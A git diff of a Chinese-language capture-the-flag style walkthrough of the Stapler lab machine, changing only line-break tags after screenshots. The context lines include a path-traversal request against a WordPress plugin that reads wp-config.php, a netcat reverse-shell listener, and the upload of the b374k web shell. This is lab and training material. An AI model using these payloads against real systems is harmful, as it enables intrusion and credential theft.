@@ -328,10 +328,10 @@ harry@192.168.0.152: Permission denied (publickey,password).
 + OSVDB-3233: GET /icons/README: Apache default file found.
 + GET /phpmyadmin/: phpMyAdmin directory found
 ```
-<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/1.png" width="56%">
+<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/1.png" width="56%"></br>
 得到两个用户名：tim、zoe
 访问web页面https://192.168.0.150:12380/blogblog/：
-<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/2.png" width="56%">
+<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/2.png" width="56%"></br>
 
 看到wordpress后，使用wpscan跑一下：</br>
 
@@ -763,7 +763,7 @@ john/incorrect(web管理员，可以上传文件)
 
 # Exploitation
 ## 1. 通过john/incorrect获取shell
-<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/3.png" width="56%">
+<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/3.png" width="56%"></br>
 ```shell
 ┌──(root㉿kali)-[/stapler]
 └─# nc -lnvp 80
@@ -1241,7 +1241,7 @@ Shellcodes: No Results
 1. 漏洞POC：http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]
     我们构造的POC：https://192.168.0.150:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php
 2. 查看漏洞的结果是在：
-   <img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/4.png" width="56%">
+   <img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/4.png" width="56%"></br>
 3. <font color="red">而且需要注意他是将内容(txt)，直接复制到文件中，并将文件后缀改成了png，因此我们在浏览器中是看不到内容的，只能将图片以文本格式打开才可以看到内容。（这在39646.py--searchsploit中写的并不详细）</font>
 4. 自己写了一个exp如下：
 ```python
@@ -1492,14 +1492,14 @@ Result			: Succeeded : [ b374k.php ] Filesize : 111695
 Serving HTTP on :: port 8080 (http://[::]:8080/) ...
 ::ffff:192.168.0.154 - - [05/Jul/2022 13:36:15] "GET /b374k.php HTTP/1.1" 200 -
 ```
-<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/5.png" width="56%">
+<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/5.png" width="56%"></br>
 访问大马：
-<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/6.png" width="56%">
+<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/6.png" width="56%"></br>
 
 ## 4. 通过phpmyadmin获取shell(与mysql相似，只不过是web界面操作)
-<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/7.png" width="56%">
+<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/7.png" width="56%"></br>
 访问小马，并反弹一个shell：
-<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/8.png" width="56%">
+<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/8.png" width="56%"></br>
 得到一个shell:
 ```shell
 ┌──(root㉿kali)-[/stapler]
